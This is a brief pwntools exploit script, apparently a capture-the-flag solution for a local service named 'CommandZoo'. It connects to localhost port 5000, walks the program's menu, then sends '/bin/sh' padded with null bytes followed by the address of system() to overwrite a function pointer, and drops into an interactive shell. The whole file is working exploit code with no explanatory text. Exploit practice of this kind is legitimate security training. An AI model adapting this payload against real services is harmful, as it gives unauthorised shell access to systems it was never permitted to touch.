from pwn import *

p = remote("localhost", 5000)

# Get this address by running `objdump -d CommandZoo | grep system`
SYSTEM_FUNC_PTR = 0x404ff0

for _ in range(4):
    p.recvuntil(b"- (or exit the application with \"exit\")")
    p.sendline(b"man")
p.recvuntil(b"- (or exit the application with \"exit\")")

payload = b"/bin/sh" + b"\0" * 9 + p32(SYSTEM_FUNC_PTR)
p.sendline(payload)
p.interactive()
